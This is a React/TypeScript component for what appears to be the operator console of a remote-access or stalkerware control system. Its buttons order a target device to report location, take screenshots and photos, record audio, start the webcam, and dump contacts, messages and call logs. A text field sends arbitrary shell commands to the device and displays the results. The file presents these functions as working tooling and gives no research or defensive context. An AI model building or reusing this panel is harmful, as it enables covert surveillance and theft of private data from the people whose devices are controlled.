import React, { useState, useEffect, useRef } from 'react';
import { Card, CardHeader, CardTitle, CardContent, Badge } from '../ui';
import type { Command } from '../../types/api';
import { CommandType, CommandStatus } from '../../types/api';
import { getApiService } from '../../services/api';

const api = getApiService();

interface CommandPanelProps {
  deviceId: string;
}

const quickCommands: { type: CommandType; label: string; icon: string; payload?: any }[] = [
  { type: CommandType.LOCATION, label: 'Get Location', icon: '📍' },
  { type: CommandType.SCREENSHOT, label: 'Screenshot', icon: '📸' },
  { type: CommandType.CAMERA, label: 'Take Photo', icon: '📷' },
  { type: CommandType.MICROPHONE, label: 'Record Audio', icon: '🎤' },
  { type: CommandType.CONTACTS, label: 'Dump Contacts', icon: '📇' },
  { type: CommandType.MESSAGES, label: 'Dump Messages', icon: '💬' },
  { type: CommandType.CALL_LOG, label: 'Call Logs', icon: '📞' },
  { type: CommandType.WEBCAM_START, label: 'Start Webcam', icon: '📹' },
];

const statusConfig: Record<CommandStatus, { variant: 'default' | 'warning' | 'success' | 'danger'; label: string }> = {
  [CommandStatus.PENDING]: { variant: 'default', label: 'Pending' },
  [CommandStatus.SENT]: { variant: 'warning', label: 'Sent' },
  [CommandStatus.EXECUTING]: { variant: 'warning', label: 'Executing' },
  [CommandStatus.COMPLETED]: { variant: 'success', label: 'Completed' },
  [CommandStatus.FAILED]: { variant: 'danger', label: 'Failed' },
  [CommandStatus.CANCELLED]: { variant: 'default', label: 'Cancelled' },
};

export const CommandPanel: React.FC<CommandPanelProps> = ({ deviceId }) => {
  const [commands, setCommands] = useState<Command[]>([]);
  const [customCommand, setCustomCommand] = useState('');
  const [isExecuting, setIsExecuting] = useState(false);
  const terminalRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    loadCommands();
  }, [deviceId]);

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [commands]);

  const loadCommands = async () => {
    try {
      const response = await api.getCommands({ deviceId, limit: 50 });
      setCommands(response.data || []);
    } catch (error) {
      console.error('Failed to load commands:', error);
    }
  };

  const executeCommand = async (type: CommandType, payload?: Record<string, unknown>) => {
    setIsExecuting(true);
    try {
      const response = await api.sendCommand({ deviceId, type, payload });
      if (response.data) {
        setCommands((prev) => [response.data as Command, ...prev]);
      }
      setCustomCommand('');
    } catch (error) {
      console.error('Failed to execute command:', error);
    } finally {
      setIsExecuting(false);
    }
  };

  const executeCustomCommand = () => {
    if (!customCommand.trim()) return;
    executeCommand(CommandType.SHELL, { command: customCommand });
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      executeCustomCommand();
    }
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
      {/* Command Input & Quick Commands */}
      <div className="lg:col-span-2 space-y-6">
        {/* Terminal Output */}
        <Card variant="glass">
          <CardHeader>
            <CardTitle>Command Output</CardTitle>
          </CardHeader>
          <CardContent>
            <div
              ref={terminalRef}
              className="bg-dark-900 rounded-lg p-4 font-mono text-sm h-[400px] overflow-y-auto space-y-2"
            >
              {commands.length === 0 ? (
                <div className="text-white/40 text-center py-8">
                  No commands executed yet. Run a command to see output.
                </div>
              ) : (
                commands.map((cmd) => (
                  <CommandOutput key={cmd.id} command={cmd} />
                ))
              )}
            </div>
          </CardContent>
        </Card>

        {/* Custom Command Input */}
        <Card variant="glass">
          <CardHeader>
            <CardTitle>Custom Command</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="flex gap-2">
              <input
                type="text"
                value={customCommand}
                onChange={(e) => setCustomCommand(e.target.value)}
                onKeyDown={handleKeyPress}
                placeholder="Enter shell command..."
                disabled={isExecuting}
                className="flex-1 px-4 py-2 bg-dark-900 border border-white/20 rounded-lg text-white placeholder:text-white/40 focus:outline-none focus:border-electric-500 font-mono"
              />
              <button
                onClick={executeCustomCommand}
                disabled={isExecuting || !customCommand.trim()}
                className="px-6 py-2 bg-electric-500 hover:bg-electric-400 text-dark-900 rounded-lg font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isExecuting ? '⏳' : '▶️'} Execute
              </button>
            </div>
            <p className="text-xs text-white/40 mt-2">Press Enter to execute, Shift+Enter for new line</p>
          </CardContent>
        </Card>
      </div>

      {/* Quick Commands */}
      <div>
        <Card variant="glass">
          <CardHeader>
            <CardTitle>Quick Commands</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-2">
              {quickCommands.map((cmd) => (
                <button
                  key={cmd.type}
                  onClick={() => executeCommand(cmd.type, cmd.payload)}
                  disabled={isExecuting}
                  className="w-full px-4 py-3 bg-white/5 hover:bg-white/10 rounded-lg text-left flex items-center gap-3 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  <span className="text-2xl">{cmd.icon}</span>
                  <span className="text-white text-sm font-medium">{cmd.label}</span>
                </button>
              ))}
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

const CommandOutput: React.FC<{ command: Command }> = ({ command }) => {
  const status = statusConfig[command.status] || statusConfig[CommandStatus.PENDING];
  const timestamp = new Date(command.createdAt).toLocaleTimeString();

  return (
    <div className="border-l-2 border-electric-500 pl-3 py-1">
      <div className="flex items-center gap-2 mb-1">
        <span className="text-white/60">[{timestamp}]</span>
        <Badge variant={status.variant} size="sm">
          {status.label}
        </Badge>
        <span className="text-electric-400">{command.type}</span>
      </div>

      {command.payload && (
        <div className="text-white/60 text-xs mb-1">
          {JSON.stringify(command.payload)}
        </div>
      )}

      {command.result?.output && (
        <div className="text-green-400 whitespace-pre-wrap">
          {command.result.output}
        </div>
      )}

      {command.result?.error && (
        <div className="text-red-400">
          Error: {command.result.error}
        </div>
      )}

      {command.status === CommandStatus.EXECUTING && (
        <div className="text-yellow-400 animate-pulse">
          Executing...
        </div>
      )}
    </div>
  );
};
